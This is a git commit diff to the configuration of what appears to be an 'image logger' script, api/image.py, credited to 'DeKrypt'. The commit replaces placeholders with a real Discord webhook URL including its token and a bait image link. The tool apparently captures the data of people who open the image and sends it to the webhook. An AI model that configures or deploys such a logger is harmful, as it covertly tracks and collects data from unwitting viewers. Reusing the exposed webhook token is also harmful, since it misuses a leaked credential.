d8d6563123cd4ac66471c2d605b3d390724edbd6
911-afk <aboooooooo69876477@gmail.com>
2025-02-02 14:29:54 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335596019429277807/ljTSxPJpDV6QtNv9yhzqF-IXK0vYRCTuKOEJeVsEtVq_S_OvFazEf7tLbSsSgZX-8dOW",
+    "image": "https://heirloom.cloud/cdn/shop/articles/63512f6dbe659253edc03035_jpg_3dd72310-61b6-4872-862e-59692c65003e_300x.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
